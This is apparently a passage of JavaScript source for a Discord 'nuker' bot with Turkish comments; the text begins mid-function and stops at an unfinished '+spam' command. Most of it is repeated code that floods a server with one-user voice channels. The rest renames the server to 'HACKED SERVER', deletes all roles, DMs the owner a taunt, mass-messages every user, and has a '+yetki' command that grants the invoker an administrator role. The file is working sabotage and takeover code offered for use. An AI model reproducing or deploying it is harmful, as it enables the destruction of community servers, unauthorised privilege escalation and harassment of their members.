        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild.createChannel("ャ", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ tasindik", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild.setIcon(
      "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    );

    await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
    await client.user.setAvatar(""); //BOTUN PP SI YAPAR
    await client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete());    //BOTUN ROLÜNÜN ALTINDAKI ROLLERİ SILER
    await msg.guild.owner.send("Sunucunu Hackledik Ağla :D");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    const kanal = await msg.guild.channels.find(x => x.name === "ャ");    //DEGISTIRMEYIN BOZULUR
    await kanal.send("BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone"); //HACKLENDIKTEN SONRA GÖNDERILEN MESAJ
  }
});
client.on("message", async msg => {
  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone"
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");
    msg.member.addRole(rol);
  }
});

client.on("message", msg => {
  if (msg.content === "+rol") {  //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER)
    msg.guild.roles.forEach(roles => roles.delete()); 
  }
});

client.on('message', msg => {
  if (msg.content === '+spam') {
